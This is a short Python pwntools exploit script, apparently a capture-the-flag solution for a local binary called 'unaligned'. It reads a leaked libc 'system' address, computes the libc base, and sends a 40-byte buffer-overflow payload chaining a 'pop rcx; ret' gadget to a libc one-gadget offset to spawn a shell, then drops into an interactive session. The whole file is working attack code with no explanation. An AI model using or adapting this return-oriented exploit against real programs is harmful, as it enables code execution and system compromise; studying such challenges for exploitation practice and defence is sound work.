from pwn import * 


elf = ELF("./unaligned")
context.binary = ELF("./unaligned")
libc = ELF("./libc.so.6")
rop = ROP(libc)


io = elf.process()
assert io
gdb.attach(io)

POP_RCX = rop.find_gadget(["pop rcx","ret"]).address
# print("RCX HERE ",hex(POP_RCX))

system = int(io.recvline().strip().decode().split(' ')[1], 16)
libc.address = system - libc.symbols.system
log.info(hex(libc.address))
log.info(hex(libc.symbols.system))

OFFSET = 40 
heading = libc.address + 0x4f2a5
print(hex(heading))
 
payload = b'A'*40 + p64(POP_RCX + libc.address) + p64(0) + p64(heading)
# p64(rop.find_gadget(["ret"])[0])

io.sendlineafter(b'Name:', payload)

io.interactive() 